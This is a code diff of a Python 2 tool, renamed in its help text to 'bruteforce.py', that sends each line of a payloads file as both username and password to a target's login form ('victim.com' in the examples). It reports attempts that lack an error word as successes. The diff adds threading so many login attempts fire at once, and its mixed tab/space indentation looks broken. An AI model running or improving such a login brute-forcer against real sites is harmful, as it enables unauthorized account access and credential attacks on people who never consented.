@@ -6,6 +6,7 @@ import urllib2
 import re
 import argparse
 import sys
+import threading
 from termcolor import colored
 from cookielib import CookieJar
 
@@ -20,10 +21,7 @@ request_headers = {
 		"Connection"      : "keep-alive" 
 }
 
-try: 
-	f 		= open("payloads.txt","r")
-except IOError:
-	sys.exit('File doesn\'t exist!')
+
 
 about = colored("""
 -----------------------------------------
@@ -42,6 +40,28 @@ about = colored("""
 
 print about
 
+
+def PayloadScan(target,username,password,exception,payload):
+
+	try:
+		request  = urllib2.Request(target,headers=request_headers)
+		cj       = CookieJar()
+		opener   = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+		data     = urllib.urlencode({username:payload,password:payload})
+		u        = opener.open(target, data)
+		getcode  = u.getcode()
+		match    = re.findall(r'{}'.format(exception),u.read())
+
+		if(match):
+				print  "%s  %s" % (payload,colored('[-]','red'))  
+		else:
+				print  "%s  %s" % (payload,colored('[+]','green'))
+	except KeyboardInterrupt:
+		print 'stopped'
+		
+
+
+
 def Main():
 
 
@@ -51,14 +71,14 @@ def Main():
                           action = "store", #stored
                           dest   = "target",
                           #type   = "string", #int tipi
-                          help = "for example: ./payloader.py -t victim.com")
+                          help = "for example: ./bruteforce.py -t victim.com")
 
 
 	parser.add_argument('-uc',
                           action = "store", #stored
                           dest   = "uc",
                           #type   = "string", #int tipi
-                          help = "for example: ./payloader.py -uc username column")
+                          help = "for example: ./bruteforce.py -uc username column")
 
 
 
@@ -66,14 +86,14 @@ def Main():
                           action = "store", #stored
                           dest   = "pc",
                           #type   = "string", #int tipi
-                          help = "for example: ./payloader.py -pc password column")
+                          help = "for example: ./bruteforce.py -pc password column")
 
 
 	parser.add_argument('-exception',
                           action = "store", #stored
                           dest   = "exception",
                           #type   = "string", #int tipi
-                          help = "for example: ./payloader.py -a exception word")
+                          help = "for example: ./bruteforce.py -a exception word")
 
 
 
@@ -96,34 +116,21 @@ def Main():
 	if args.exception:
 		print("# Creating exception " + args.exception)	
 
-	print '--------------------------------------------'	
 	target   = args.target
 
+	print '--------------------------------------------'	
 
-	request  = urllib2.Request(target,headers=request_headers)
+	try: 
+		f 		= open("payloads.txt","r")
+	except IOError:
+		sys.exit('File doesn\'t exist!')
 
+	threads = []
 	for line in f.readlines():
-		
-		try:
-			
-			cj = CookieJar()
-			opener   = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-			data     = urllib.urlencode({args.uc:line.rstrip('\n'),args.pc:line.rstrip('\n')})
-			u        = opener.open(target, data)
-			getcode  = u.getcode()
-			#print u.read()
-			
-			match    = re.findall(r'{}'.format(args.exception),u.read())
-		except KeyboardInterrupt:
-			print 'stopped'
-
-		
-
-		if(match):
-			print  line.rstrip('\n') + " " + colored('[-]', 'red')
-		else:
-			print line.rstrip('\n') + " " + colored('[+]', 'green')
-
+         t = threading.Thread(target = PayloadScan, args = (target,args.uc,args.pc,args.exception,line.rstrip('\n')))
+         threads.append(t)
+         t.start()
+	
 
 if __name__ == "__main__":
 	Main()
